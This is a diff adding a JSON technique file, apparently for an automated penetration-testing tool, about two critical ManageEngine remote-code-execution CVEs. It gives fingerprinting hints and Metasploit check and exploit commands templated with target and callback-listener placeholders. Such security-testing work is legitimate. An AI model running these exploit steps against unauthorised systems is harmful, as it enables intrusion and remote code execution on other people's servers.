@@ -1,0 +1,53 @@
+{
+  "product": "manageengine",
+  "associated_ports": ["8080", "8443", "9251"],
+  "techniques": [
+    {
+      "id": "manageengine-adselfservice-cve-2021-40539",
+      "title": "ManageEngine ADSelfService Plus auth bypass → RCE (CVE-2021-40539)",
+      "severity": "critical",
+      "detection_signals": ["manageengine", "adselfservice", "fluidic"],
+      "preconditions": [
+        "ADSelfService Plus build <= 6113",
+        "REST API endpoints reachable (often behind a reverse proxy / tunnel)"
+      ],
+      "notes": "Unauthenticated REST-API auth bypass chained to remote code execution. Fingerprint hints: /fluidicv2/ frontend, SendPassword.do, j_security_check. Confirm the exact build before claiming applicability.",
+      "validate_steps": [
+        "Fingerprint the product + build (login page footer, /fluidicv2/ assets, SendPassword.do).",
+        "Use the Metasploit check: use exploit/windows/http/manageengine_adselfservice_plus_cve_2021_40539; set RHOSTS <t>; check"
+      ],
+      "exploit_steps": [
+        "Metasploit: use exploit/windows/http/manageengine_adselfservice_plus_cve_2021_40539",
+        "set RHOSTS {target}; set RPORT {port}; set LHOST {lhost}; set LPORT {lport}; run"
+      ],
+      "cves": ["CVE-2021-40539"],
+      "refs": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2021-40539",
+        "https://www.cisa.gov/news-events/alerts/2021/09/16/apt-exploitation-manageengine-adselfservice-plus"
+      ]
+    },
+    {
+      "id": "manageengine-saml-cve-2022-47966",
+      "title": "ManageEngine SAML unauthenticated RCE (CVE-2022-47966)",
+      "severity": "critical",
+      "detection_signals": ["manageengine", "adselfservice", "fluidic"],
+      "preconditions": [
+        "SAML SSO was ever configured on an affected ManageEngine product/build",
+        "outdated Apache Santuario (xmlsec) dependency"
+      ],
+      "notes": "Unauthenticated RCE via a crafted SAML response when SAML SSO is/was enabled. Applicability depends on the exact product and build — verify before asserting.",
+      "validate_steps": [
+        "Confirm product + build and whether a samlLogin/<guid> endpoint exists.",
+        "Metasploit check: use exploit/multi/http/manageengine_saml_rce_cve_2022_47966; set RHOSTS <t>; check"
+      ],
+      "exploit_steps": [
+        "Metasploit: use exploit/multi/http/manageengine_saml_rce_cve_2022_47966",
+        "set RHOSTS {target}; set RPORT {port}; set LHOST {lhost}; set LPORT {lport}; run"
+      ],
+      "cves": ["CVE-2022-47966"],
+      "refs": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2022-47966"
+      ]
+    }
+  ]
+}
